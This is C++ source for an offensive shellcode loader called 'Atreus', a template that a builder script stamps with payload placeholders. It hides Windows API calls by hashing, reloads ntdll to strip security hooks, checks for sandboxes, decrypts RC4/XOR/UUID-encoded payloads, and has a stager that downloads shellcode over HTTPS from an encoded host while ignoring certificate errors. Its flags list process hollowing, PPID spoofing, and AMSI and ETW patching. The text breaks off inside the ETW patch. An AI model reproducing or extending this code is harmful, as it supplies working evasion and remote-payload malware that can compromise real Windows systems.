// Atreus Shellcode Loader v2
// Feature flags (via -D):
//   USE_RC4           : RC4 decryption (default: XOR if USE_XOR)
//   USE_XOR           : XOR decryption
//   USE_PPID_SPOOF    : Spoof PPID to explorer.exe
//   USE_THREAD_HIJACK : RIP redirect instead of Early Bird APC
//   USE_HOLLOW        : Process Hollowing (unmap original + RIP redirect)
//   USE_REMOTE_THREAD : NtCreateThreadEx in an existing process (no CreateProcess)
//   USE_SELF_INJECT   : NtCreateThreadEx in current process
//   USE_FIBER_INJECT  : Fiber switch (ConvertThreadToFiber + CreateFiber, no new thread)
//   USE_AMSI_PATCH    : Patch AmsiScanBuffer
//   USE_SANDBOX_CHECK : Basic sandbox/timing detection
//   USE_WIPE          : Zero heap payload after injection
//   USE_ETW_PATCH     : Patch EtwEventWrite before injection
//   USE_UNHOOK        : Remap ntdll .text from disk before injection
//   USE_HELLSHALL    : Direct/indirect syscalls (HellsHall) - bypasses ntdll hooks
//   ATREUS_DEBUG      : Log each step to %TEMP%\atreus_debug.log (no console needed)

#define WIN32_LEAN_AND_MEAN
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include <string.h>

#ifdef USE_HELLSHALL
#include "hellshall.hpp"
#endif

// ─── Debug helper (ATREUS_DEBUG only) ────────────────────────────────────────

#ifdef ATREUS_DEBUG
static HANDLE _dbg_fh = INVALID_HANDLE_VALUE;
static char   _dbg_buf[512];

static void _dbg_open() {
    if (_dbg_fh != INVALID_HANDLE_VALUE) return;
    /* Write to C:\Windows\Temp\atreus_debug.log (always exists, writable by SYSTEM/session0) */
    _dbg_fh = CreateFileA("C:\\Windows\\Temp\\atreus_debug.log", GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, NULL);
}
static DWORD _dbg_strlen(const char *s) { DWORD n=0; while(s[n]) n++; return n; }
static void _dbg_write(const char *msg) {
    _dbg_open();
    if (!_dbg_fh || _dbg_fh == INVALID_HANDLE_VALUE) return;
    DWORD w; WriteFile(_dbg_fh, msg, _dbg_strlen(msg), &w, NULL);
    WriteFile(_dbg_fh, "\r\n", 2, &w, NULL);
}
static void _dbg_append(char *dst, const char *src, int max) {
    int i=0; while(dst[i]) i++;
    int j=0; while(src[j] && i<max-1) dst[i++]=src[j++]; dst[i]='\0';
}
static void _dbg_ulltoa(unsigned long long v, char *s) {
    if (!v) { s[0]='0'; s[1]='\0'; return; }
    char tmp[24]; int i=0;
    while (v) { tmp[i++]=(char)('0'+(v%10)); v/=10; }
    int j=0; while(i>0) s[j++]=tmp[--i]; s[j]='\0';
}
static void _dbg_hexstr(unsigned long long val, char *out) {
    static const char h[]="0123456789ABCDEF";
    out[0]='0'; out[1]='x'; int i=2;
    for(int s=60; s>=0; s-=4) { unsigned char n=(unsigned char)((val>>s)&0xF); if(n||i>2) out[i++]=h[n]; }
    if(i==2) out[i++]='0';
    out[i]='\0';
}
static void dbg(const char *msg) { _dbg_write(msg); }
static void dbg_val(const char *msg, unsigned long long val) {
    char num[24]; _dbg_ulltoa(val, num);
    _dbg_buf[0]='\0'; _dbg_append(_dbg_buf, msg, 480);
    _dbg_append(_dbg_buf, ": ", 480); _dbg_append(_dbg_buf, num, 480);
    _dbg_write(_dbg_buf);
}
static void dbg_hex(const char *msg, unsigned long long val) {
    char num[20]; _dbg_hexstr(val, num);
    _dbg_buf[0]='\0'; _dbg_append(_dbg_buf, msg, 480);
    _dbg_append(_dbg_buf, ": ", 480); _dbg_append(_dbg_buf, num, 480);
    _dbg_write(_dbg_buf);
}
#define DBG(msg)       dbg(msg)
#define DBG_VAL(m,v)   dbg_val(m,(unsigned long long)(v))
#define DBG_HEX(m,v)   dbg_hex(m,(unsigned long long)(v))

// Console entry point for debug builds (replaces GUI WinMain)
int main() { return WinMain(NULL, NULL, NULL, 0); }

#else
#define DBG(msg)       ((void)0)
#define DBG_VAL(m,v)   ((void)0)
#define DBG_HEX(m,v)   ((void)0)
#endif

// ─── Compile-time hash (no API name strings in binary) ──────────────────────

static constexpr DWORD _hA(const char *s, DWORD h = 5381) {
    return *s ? _hA(s + 1, h * 33 ^ (DWORD)(unsigned char)*s) : h;
}
static constexpr DWORD _hW(const wchar_t *s, DWORD h = 5381) {
    return *s ? _hW(s + 1, h * 33 ^ (DWORD)((*s >= L'A' && *s <= L'Z') ? *s + 32 : *s)) : h;
}

constexpr DWORD HMOD_KERNEL32   = _hW(L"kernel32.dll");
constexpr DWORD HMOD_KERNELBASE = _hW(L"kernelbase.dll");
constexpr DWORD HMOD_NTDLL      = _hW(L"ntdll.dll");
#ifdef USE_AMSI_PATCH
constexpr DWORD HMOD_AMSI     = _hW(L"amsi.dll");
#endif

constexpr DWORD HF_CreateFileA              = _hA("CreateFileA");
constexpr DWORD HF_CreateFileMappingA       = _hA("CreateFileMappingA");
constexpr DWORD HF_MapViewOfFile            = _hA("MapViewOfFile");
constexpr DWORD HF_UnmapViewOfFile          = _hA("UnmapViewOfFile");
constexpr DWORD HF_CloseHandle              = _hA("CloseHandle");
constexpr DWORD HF_VirtualProtect           = _hA("VirtualProtect");
constexpr DWORD HF_VirtualAlloc             = _hA("VirtualAlloc");
constexpr DWORD HF_VirtualFree              = _hA("VirtualFree");
#ifdef USE_MODULE_STOMP
constexpr DWORD HF_NtCreateSection          = _hA("NtCreateSection");
constexpr DWORD HF_NtMapViewOfSection       = _hA("NtMapViewOfSection");
#endif
#if defined(USE_LOCAL_MAP_INJECT) || defined(USE_REMOTE_MAP_INJECT)
constexpr DWORD HF_CreateFileMappingW       = _hA("CreateFileMappingW");
#endif
#ifdef USE_REMOTE_MAP_INJECT
constexpr DWORD HF_MapViewOfFile2           = _hA("MapViewOfFile2");
#endif
#if defined(USE_REFLECTIVE_LOAD) || defined(USE_FUNC_STOMP) || defined(USE_STAGER)
constexpr DWORD HF_GetProcAddress           = _hA("GetProcAddress");
#endif
#ifdef USE_STAGER
constexpr DWORD HF_WinHttpOpen              = _hA("WinHttpOpen");
constexpr DWORD HF_WinHttpConnect           = _hA("WinHttpConnect");
constexpr DWORD HF_WinHttpOpenRequest       = _hA("WinHttpOpenRequest");
constexpr DWORD HF_WinHttpSendRequest       = _hA("WinHttpSendRequest");
constexpr DWORD HF_WinHttpReceiveResponse   = _hA("WinHttpReceiveResponse");
constexpr DWORD HF_WinHttpQueryDataAvailable= _hA("WinHttpQueryDataAvailable");
constexpr DWORD HF_WinHttpReadData          = _hA("WinHttpReadData");
constexpr DWORD HF_WinHttpCloseHandle       = _hA("WinHttpCloseHandle");
constexpr DWORD HF_WinHttpSetOption         = _hA("WinHttpSetOption");
#endif
#ifdef USE_FUNC_STOMP
constexpr DWORD HF_VirtualProtectEx         = _hA("VirtualProtectEx");
constexpr DWORD HF_WriteProcessMemory       = _hA("WriteProcessMemory");
constexpr DWORD HF_Module32FirstW           = _hA("Module32FirstW");
constexpr DWORD HF_Module32NextW            = _hA("Module32NextW");
#endif
constexpr DWORD HF_CreateProcessW           = _hA("CreateProcessW");
constexpr DWORD HF_ResumeThread             = _hA("ResumeThread");
constexpr DWORD HF_LoadLibraryA             = _hA("LoadLibraryA");
#if defined(USE_PPID_SPOOF) || defined(USE_REMOTE_THREAD) || defined(USE_REMOTE_MAP_INJECT) || defined(USE_FUNC_STOMP)
constexpr DWORD HF_CreateToolhelp32Snapshot = _hA("CreateToolhelp32Snapshot");
constexpr DWORD HF_Process32FirstW          = _hA("Process32FirstW");
constexpr DWORD HF_Process32NextW           = _hA("Process32NextW");
constexpr DWORD HF_OpenProcess              = _hA("OpenProcess");
#endif
#ifdef USE_PPID_SPOOF
constexpr DWORD HF_InitProcThreadAttrList   = _hA("InitializeProcThreadAttributeList");
constexpr DWORD HF_UpdateProcThreadAttr     = _hA("UpdateProcThreadAttribute");
constexpr DWORD HF_DeleteProcThreadAttrList = _hA("DeleteProcThreadAttributeList");
#endif
#if defined(USE_REMOTE_THREAD) || defined(USE_SELF_INJECT) || defined(USE_LOCAL_MAP_INJECT) || defined(USE_REMOTE_MAP_INJECT) || defined(USE_FUNC_STOMP) || defined(USE_FIBER_INJECT) || defined(USE_MODULE_STOMP)
constexpr DWORD HF_NtCreateThreadEx         = _hA("NtCreateThreadEx");
#endif
#if defined(USE_SELF_INJECT) || defined(USE_LOCAL_MAP_INJECT) || defined(USE_FIBER_INJECT) || defined(USE_MODULE_STOMP)
constexpr DWORD HF_NtWaitForSingleObject    = _hA("NtWaitForSingleObject");
#endif
#if defined(USE_FIBER_INJECT) || defined(USE_MODULE_STOMP)
constexpr DWORD HF_ConvertThreadToFiber     = _hA("ConvertThreadToFiber");
constexpr DWORD HF_CreateFiber              = _hA("CreateFiber");
constexpr DWORD HF_SwitchToFiber            = _hA("SwitchToFiber");
constexpr DWORD HF_DeleteFiber              = _hA("DeleteFiber");
#endif
#ifdef USE_SANDBOX_CHECK
constexpr DWORD HF_GetTickCount64           = _hA("GetTickCount64");
constexpr DWORD HF_Sleep                    = _hA("Sleep");
constexpr DWORD HF_GlobalMemoryStatusEx     = _hA("GlobalMemoryStatusEx");
constexpr DWORD HF_GetSystemInfo            = _hA("GetSystemInfo");
#endif

constexpr DWORD HF_NtDelayExecution         = _hA("NtDelayExecution");
constexpr DWORD HF_NtAllocateVirtualMemory  = _hA("NtAllocateVirtualMemory");
constexpr DWORD HF_NtFreeVirtualMemory      = _hA("NtFreeVirtualMemory");
constexpr DWORD HF_NtWriteVirtualMemory     = _hA("NtWriteVirtualMemory");
constexpr DWORD HF_NtProtectVirtualMemory   = _hA("NtProtectVirtualMemory");
constexpr DWORD HF_NtQueueApcThread         = _hA("NtQueueApcThread");
constexpr DWORD HF_NtResumeThread           = _hA("NtResumeThread");
constexpr DWORD HF_EtwEventWrite            = _hA("EtwEventWrite");
#if defined(USE_THREAD_HIJACK) || defined(USE_HOLLOW)
constexpr DWORD HF_NtGetContextThread       = _hA("NtGetContextThread");
constexpr DWORD HF_NtSetContextThread       = _hA("NtSetContextThread");
#endif
#ifdef USE_HOLLOW
constexpr DWORD HF_NtQueryInformationProcess = _hA("NtQueryInformationProcess");
constexpr DWORD HF_NtReadVirtualMemory       = _hA("NtReadVirtualMemory");
constexpr DWORD HF_NtUnmapViewOfSection      = _hA("NtUnmapViewOfSection");
#endif
#ifdef USE_AMSI_PATCH
constexpr DWORD HF_AmsiScanBuffer           = _hA("AmsiScanBuffer");
#endif

// ─── PEB walk: find module by hash ──────────────────────────────────────────

typedef struct _MY_LDR_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_ENTRY;

static HMODULE peb_module(DWORD hash) {
#ifdef _WIN64
    PEB *peb = (PEB *)__readgsqword(0x60);
#else
    PEB *peb = (PEB *)__readfsdword(0x30);
#endif
    LIST_ENTRY *head = &peb->Ldr->InMemoryOrderModuleList;
    for (LIST_ENTRY *e = head->Flink; e != head; e = e->Flink) {
        MY_LDR_ENTRY *m = CONTAINING_RECORD(e, MY_LDR_ENTRY, InMemoryOrderLinks);
        if (!m->BaseDllName.Buffer) continue;
        DWORD h = 5381;
        for (WCHAR *p = m->BaseDllName.Buffer; *p; p++) {
            WCHAR c = (*p >= L'A' && *p <= L'Z') ? *p + 32 : *p;
            h = h * 33 ^ (DWORD)c;
        }
        if (h == hash) return (HMODULE)m->DllBase;
    }
    return NULL;
}

// ─── Export table walk: resolve function by hash (handles forwarded exports) ─

static DWORD _hash_name_ascii(const char *s) {
    DWORD h = 5381;
    while (*s) h = h * 33 ^ (DWORD)(unsigned char)*s++;
    return h;
}
static DWORD _hash_dll_name(const char *s) {
    /* Same as _hW but from ASCII, lowercase A-Z -> a-z */
    DWORD h = 5381;
    for (; *s; s++) {
        unsigned char c = (unsigned char)*s;
        if (c >= 'A' && c <= 'Z') c += 32;
        h = h * 33 ^ (DWORD)c;
    }
    return h;
}

static FARPROC resolve(HMODULE hMod, DWORD hash, int depth = 0) {
    if (!hMod || depth > 4) return NULL;
    BYTE *base = (BYTE *)hMod;
    IMAGE_DOS_HEADER *dos  = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt   = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    DWORD exp_rva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exp_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!exp_rva) return NULL;
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);
    DWORD *names    = (DWORD *)(base + exp->AddressOfNames);
    WORD  *ordinals = (WORD  *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD *)(base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char *)(base + names[i]);
        DWORD h = 5381;
        const char *p = name;
        while (*p) h = h * 33 ^ (DWORD)(unsigned char)*p++;
        if (h != hash) continue;
        DWORD fn_rva = funcs[ordinals[i]];
        /* Forwarded export: RVA falls inside the export directory region */
        if (fn_rva >= exp_rva && fn_rva < exp_rva + exp_size) {
            /* String format: "DLLNAME.FuncName" (DLLNAME has no .dll suffix) */
            const char *fwd = (const char *)(base + fn_rva);
            char dll_buf[72]; int di = 0;
            p = fwd;
            while (*p && *p != '.' && di < 63) dll_buf[di++] = *p++;
            dll_buf[di++]='.'; dll_buf[di++]='d'; dll_buf[di++]='l'; dll_buf[di++]='l'; dll_buf[di]='\0';
            if (*p == '.') p++;
            DWORD fn_hash  = _hash_name_ascii(p);
            DWORD dll_hash = _hash_dll_name(dll_buf);
            HMODULE hFwd   = peb_module(dll_hash);
            if (hFwd) return resolve(hFwd, fn_hash, depth + 1);
            return NULL;
        }
        return (FARPROC)(base + fn_rva);
    }
    return NULL;
}

#define R(mod, fn)   resolve(peb_module(mod), fn)
/* Try kernel32 first, fall back to KernelBase (API-set forwarding) */
#define RK32(fn)     ([&]() -> FARPROC { \
    FARPROC _p = resolve(peb_module(HMOD_KERNEL32),   fn); \
    if (!_p)  _p = resolve(peb_module(HMOD_KERNELBASE), fn); \
    return _p; }())

// ─── ntdll unhook: remap .text from clean disk copy ─────────────────────────

#ifdef USE_UNHOOK
static void unhook_ntdll() {
    HMODULE hK32   = peb_module(HMOD_KERNEL32);
    HMODULE hNtdll = peb_module(HMOD_NTDLL);
    if (!hK32 || !hNtdll) return;

    typedef HANDLE (WINAPI *t_CFA)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
    typedef HANDLE (WINAPI *t_CFMA)(HANDLE,LPSECURITY_ATTRIBUTES,DWORD,DWORD,DWORD,LPCSTR);
    typedef LPVOID (WINAPI *t_MVF)(HANDLE,DWORD,DWORD,DWORD,SIZE_T);
    typedef BOOL   (WINAPI *t_UMVF)(LPCVOID);
    typedef BOOL   (WINAPI *t_CH)(HANDLE);
    typedef BOOL   (WINAPI *t_VP)(LPVOID,SIZE_T,DWORD,PDWORD);

    t_CFA  pCFA  = (t_CFA) R(HMOD_KERNEL32, HF_CreateFileA);
    t_CFMA pCFMA = (t_CFMA)R(HMOD_KERNEL32, HF_CreateFileMappingA);
    t_MVF  pMVF  = (t_MVF) R(HMOD_KERNEL32, HF_MapViewOfFile);
    t_UMVF pUMVF = (t_UMVF)R(HMOD_KERNEL32, HF_UnmapViewOfFile);
    t_CH   pCH   = (t_CH)  R(HMOD_KERNEL32, HF_CloseHandle);
    t_VP   pVP   = (t_VP)  R(HMOD_KERNEL32, HF_VirtualProtect);
    if (!pCFA || !pCFMA || !pMVF || !pUMVF || !pCH || !pVP) return;

    /* Build path on stack to avoid static string */
    char path[48];
    const char s[] = { 'C',':','\\','W','i','n','d','o','w','s','\\',
                        'S','y','s','t','e','m','3','2','\\',
                        'n','t','d','l','l','.','d','l','l','\0' };
    memcpy(path, s, sizeof(s));

    HANDLE hFile = pCFA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    HANDLE hMap = pCFMA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) { pCH(hFile); return; }
    LPVOID pClean = pMVF(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!pClean) { pCH(hMap); pCH(hFile); return; }

    BYTE *base = (BYTE *)hNtdll;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + ((IMAGE_DOS_HEADER *)base)->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            DWORD old;
            LPVOID addr = base + sec->VirtualAddress;
            SIZE_T sz   = sec->Misc.VirtualSize;
            if (pVP(addr, sz, PAGE_EXECUTE_READWRITE, &old)) {
                memcpy(addr, (BYTE *)pClean + sec->VirtualAddress, sz);
                pVP(addr, sz, old, &old);
            }
            break;
        }
    }
    pUMVF(pClean); pCH(hMap); pCH(hFile);
}
#endif /* USE_UNHOOK */

// ─── Stager mode (USE_STAGER): download payload at runtime via WinHTTP ───────

#ifdef USE_STAGER

static const unsigned char _stager_key[]      = { %RC4_KEY% };
static const unsigned char _stager_host_enc[] = { %STAGER_HOST_ENC% };
static const WORD           _stager_port       = %STAGER_PORT%;
static const unsigned char _stager_path_enc[] = { %STAGER_PATH_ENC% };
static const unsigned char _stager_xk          = %STAGER_XOR_KEY%;

static void _xdec(const unsigned char *enc, size_t n, char *out) {
    for (size_t i = 0; i < n; i++) out[i] = (char)(enc[i] ^ _stager_xk);
    out[n] = '\0';
}
static void _xdecw(const unsigned char *enc, size_t n, WCHAR *out) {
    for (size_t i = 0; i < n; i++) out[i] = (WCHAR)(enc[i] ^ _stager_xk);
    out[n] = L'\0';
}

static unsigned char *stager_fetch(size_t *out_size) {
    typedef LPVOID  (WINAPI *t_WO) (LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
    typedef LPVOID  (WINAPI *t_WC) (LPVOID,LPCWSTR,WORD,DWORD);
    typedef LPVOID  (WINAPI *t_WOR)(LPVOID,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
    typedef BOOL    (WINAPI *t_WSR)(LPVOID,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
    typedef BOOL    (WINAPI *t_WRR)(LPVOID,LPVOID);
    typedef BOOL    (WINAPI *t_WQD)(LPVOID,LPDWORD);
    typedef BOOL    (WINAPI *t_WRD)(LPVOID,LPVOID,DWORD,LPDWORD);
    typedef BOOL    (WINAPI *t_WCH)(LPVOID);
    typedef HMODULE (WINAPI *t_LLA)(LPCSTR);
    typedef LPVOID  (WINAPI *t_VA) (LPVOID,SIZE_T,DWORD,DWORD);

    HMODULE hK32 = peb_module(HMOD_KERNEL32);
    t_LLA pLLA = (t_LLA)resolve(hK32, HF_LoadLibraryA);
    t_VA  pVA  = (t_VA) resolve(hK32, HF_VirtualAlloc);
    if (!pLLA || !pVA) { DBG("[SF] FAIL: K32 API resolution"); return NULL; }
    DBG("[SF1] K32 APIs resolved");

    /* "winhttp.dll" XOR'd with 0x5A - never a plain string in binary */
    const unsigned char whttp_enc[] = {
        'w'^0x5A,'i'^0x5A,'n'^0x5A,'h'^0x5A,'t'^0x5A,'t'^0x5A,
        'p'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A
    };
    char whttp_name[12];
    for (int _wi = 0; _wi < 11; _wi++) whttp_name[_wi] = (char)(whttp_enc[_wi] ^ 0x5A);
    whttp_name[11] = '\0';
    HMODULE hWH = pLLA(whttp_name);
    if (!hWH) { DBG("[SF] FAIL: LoadLibrary winhttp.dll"); return NULL; }
    DBG("[SF2] winhttp.dll loaded");

    t_WO  pWO  = (t_WO) resolve(hWH, HF_WinHttpOpen);
    t_WC  pWC  = (t_WC) resolve(hWH, HF_WinHttpConnect);
    t_WOR pWOR = (t_WOR)resolve(hWH, HF_WinHttpOpenRequest);
    t_WSR pWSR = (t_WSR)resolve(hWH, HF_WinHttpSendRequest);
    t_WRR pWRR = (t_WRR)resolve(hWH, HF_WinHttpReceiveResponse);
    t_WQD pWQD = (t_WQD)resolve(hWH, HF_WinHttpQueryDataAvailable);
    t_WRD pWRD = (t_WRD)resolve(hWH, HF_WinHttpReadData);
    t_WCH pWCH = (t_WCH)resolve(hWH, HF_WinHttpCloseHandle);
    if (!pWO||!pWC||!pWOR||!pWSR||!pWRR||!pWQD||!pWRD||!pWCH) {
        DBG("[SF] FAIL: WinHttp API resolution"); return NULL;
    }
    DBG("[SF3] WinHttp APIs resolved");

    WCHAR host[128]; _xdecw(_stager_host_enc, sizeof(_stager_host_enc), host);
    WCHAR path[256]; _xdecw(_stager_path_enc, sizeof(_stager_path_enc), path);
    const WCHAR ua[]  = { L'M',L'o',L'z',L'i',L'l',L'l',L'a',L'/',L'5',L'.',L'0',L'\0' };
    const WCHAR get[] = { L'G',L'E',L'T',L'\0' };
    DBG_VAL("[SF4] stager port", (unsigned long long)_stager_port);

    LPVOID hSes = pWO(ua, 1 /*WINHTTP_ACCESS_TYPE_NO_PROXY*/, NULL, NULL, 0);
    if (!hSes) { DBG("[SF] FAIL: WinHttpOpen"); return NULL; }
    DBG("[SF5] WinHttpOpen OK");
    LPVOID hCon = pWC(hSes, host, (WORD)_stager_port, 0);
    if (!hCon) { pWCH(hSes); DBG("[SF] FAIL: WinHttpConnect"); return NULL; }
    DBG("[SF6] WinHttpConnect OK");
    /* WINHTTP_FLAG_SECURE = 0x00800000 */
    LPVOID hReq = pWOR(hCon, get, path, NULL, NULL, NULL, 0x00800000);
    if (!hReq) { pWCH(hCon); pWCH(hSes); DBG("[SF] FAIL: WinHttpOpenRequest"); return NULL; }
    DBG("[SF7] WinHttpOpenRequest OK (HTTPS)");
    /* Ignore self-signed cert: WINHTTP_OPTION_SECURITY_FLAGS=31, SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS=0x3300 */
    {
        typedef BOOL (WINAPI *t_WSOP)(LPVOID,DWORD,LPVOID,DWORD);
        t_WSOP pWSOP = (t_WSOP)resolve(hWH, HF_WinHttpSetOption);
        if (pWSOP) { DWORD sf = 0x3300; pWSOP(hReq, 31, &sf, sizeof(sf)); DBG("[SF7b] cert ignore set"); }
        else { DBG("[SF7b] WARN: WinHttpSetOption not found"); }
    }
    if (!pWSR(hReq, NULL, 0, NULL, 0, 0, 0)) {
        pWCH(hReq); pWCH(hCon); pWCH(hSes); DBG("[SF] FAIL: WinHttpSendRequest"); return NULL;
    }
    DBG("[SF8] WinHttpSendRequest OK");
    if (!pWRR(hReq, NULL)) {
        pWCH(hReq); pWCH(hCon); pWCH(hSes); DBG("[SF] FAIL: WinHttpReceiveResponse"); return NULL;
    }
    DBG("[SF9] WinHttpReceiveResponse OK");

    const SIZE_T MAX_SC = 4 * 1024 * 1024;
    unsigned char *buf = (unsigned char *)pVA(NULL, MAX_SC, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { pWCH(hReq); pWCH(hCon); pWCH(hSes); DBG("[SF] FAIL: VirtualAlloc buffer"); return NULL; }
    DBG("[SF10] recv buffer allocated");

    size_t total = 0;
    DWORD avail = 0, nread = 0;
    while (pWQD(hReq, &avail) && avail > 0 && (total + avail) <= MAX_SC) {
        if (pWRD(hReq, buf + total, avail, &nread)) total += nread;
        else break;
    }
    pWCH(hReq); pWCH(hCon); pWCH(hSes);
    DBG_VAL("[SF11] total bytes received", (unsigned long long)total);
    *out_size = total;
    return (total > 0) ? buf : NULL;
}

#endif /* USE_STAGER */

// ─── RC4 (needed by stager and embedded RC4 path) ────────────────────────────

#if defined(USE_RC4) || defined(USE_STAGER)
static void rc4_crypt(const unsigned char *key, size_t klen,
                      unsigned char *data, size_t dlen) {
    unsigned char S[256];
    for (int i = 0; i < 256; i++) S[i] = (unsigned char)i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % klen]) & 0xFF;
        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
    }
    int x = 0; j = 0;
    for (size_t i = 0; i < dlen; i++) {
        x = (x + 1) & 0xFF;
        j = (j + S[x]) & 0xFF;
        unsigned char t = S[x]; S[x] = S[j]; S[j] = t;
        data[i] ^= S[(S[x] + S[j]) & 0xFF];
    }
}
#endif /* USE_RC4 || USE_STAGER */

// ─── Payload (stamped by builder.py) ────────────────────────────────────────

#ifndef USE_STAGER
#ifdef USE_UUID
static const char *g_payload_uuids[] = { %PAYLOAD% };
static const size_t g_uuid_count     = %UUID_COUNT%;
static const size_t payload_size     = %PAYLOAD_SIZE%;

static BYTE _hb(char c) {
    if (c >= '0' && c <= '9') return (BYTE)(c - '0');
    if (c >= 'a' && c <= 'f') return (BYTE)(c - 'a' + 10);
    return (BYTE)(c - 'A' + 10);
}
static void uuid_decode(const char *u, BYTE *out) {
    static const int pos[] = {0,2,4,6, 9,11, 14,16, 19,21, 24,26,28,30,32,34};
    for (int i = 0; i < 16; i++)
        out[i] = (_hb(u[pos[i]]) << 4) | _hb(u[pos[i]+1]);
}
#else

#ifdef USE_RC4
static const unsigned char rc4_key[] = { %RC4_KEY% };
#endif /* USE_RC4 */

// ─── XOR ─────────────────────────────────────────────────────────────────────

#ifdef USE_XOR
static void xor_crypt(unsigned char *buf, size_t len) {
    const unsigned char key[] = { %XOR_KEY_BYTES% };
    const size_t klen = sizeof(key);
    for (size_t i = 0; i < len; i++) buf[i] ^= key[i % klen];
}
#endif

static unsigned char payload[] = { %PAYLOAD% };
static const size_t  payload_size = sizeof(payload);

#endif /* USE_UUID */
#endif /* ifndef USE_STAGER */

// ─── Sandbox check ───────────────────────────────────────────────────────────

#ifdef USE_SANDBOX_CHECK
static int sandbox_check() {
    HMODULE hK32 = peb_module(HMOD_KERNEL32);

    typedef ULONGLONG (WINAPI *t_GTC64)();
    typedef void      (WINAPI *t_Sleep)(DWORD);
    typedef BOOL      (WINAPI *t_GMSE)(LPMEMORYSTATUSEX);
    typedef void      (WINAPI *t_GSI)(LPSYSTEM_INFO);

    t_GTC64 pGTC64 = (t_GTC64)R(HMOD_KERNEL32, HF_GetTickCount64);
    t_Sleep pSleep = (t_Sleep)R(HMOD_KERNEL32, HF_Sleep);
    t_GMSE  pGMSE  = (t_GMSE) R(HMOD_KERNEL32, HF_GlobalMemoryStatusEx);
    t_GSI   pGSI   = (t_GSI)  R(HMOD_KERNEL32, HF_GetSystemInfo);

    /* Uptime > 5 minutes */
    if (pGTC64 && pGTC64() < 300000ULL) return 0;

    /* RAM > 2 GB */
    if (pGMSE) {
        MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms);
        if (pGMSE(&ms) && ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return 0;
    }

    /* >= 2 logical CPUs */
    if (pGSI) {
        SYSTEM_INFO si; pGSI(&si);
        if (si.dwNumberOfProcessors < 2) return 0;
    }

    /* Sleep skipping check: sleep 500ms, verify at least 400ms elapsed */
    if (pSleep && pGTC64) {
        ULONGLONG t0 = pGTC64();
        pSleep(500);
        if (pGTC64() - t0 < 400) return 0;
    }

    return 1;
}
#endif /* USE_SANDBOX_CHECK */

// ─── Process lookup by name (PPID spoof + remote thread) ────────────────────

#if defined(USE_PPID_SPOOF) || defined(USE_REMOTE_THREAD) || defined(USE_REMOTE_MAP_INJECT) || defined(USE_FUNC_STOMP)
#include <tlhelp32.h>
static DWORD find_process_pid(const wchar_t *name) {
    typedef HANDLE (WINAPI *t_CTS)(DWORD, DWORD);
    typedef BOOL   (WINAPI *t_P32FW)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL   (WINAPI *t_P32NW)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL   (WINAPI *t_CH)(HANDLE);

    t_CTS  pCTS  = (t_CTS) R(HMOD_KERNEL32, HF_CreateToolhelp32Snapshot);
    t_P32FW pPFF = (t_P32FW)R(HMOD_KERNEL32, HF_Process32FirstW);
    t_P32NW pPFN = (t_P32NW)R(HMOD_KERNEL32, HF_Process32NextW);
    t_CH    pCH  = (t_CH)  R(HMOD_KERNEL32, HF_CloseHandle);
    if (!pCTS || !pPFF || !pPFN || !pCH) return 0;

    HANDLE snap = pCTS(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (pPFF(snap, &pe)) do {
        if (_wcsicmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
    } while (pPFN(snap, &pe));
    pCH(snap);
    return pid;
}
#endif /* USE_PPID_SPOOF || USE_REMOTE_THREAD */

// ─── WinMain ─────────────────────────────────────────────────────────────────

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {

    DBG("[1] Atreus started");

#ifdef USE_SANDBOX_CHECK
    if (!sandbox_check()) { DBG("[FAIL] Sandbox check failed - exiting"); return 0; }
    DBG("[1] Sandbox check passed");
#endif

#ifdef USE_UNHOOK
    unhook_ntdll();
    DBG("[2] ntdll unhooked");
#endif

    /* ETW patch: xor eax,eax; ret */
#ifdef USE_ETW_PATCH
    {
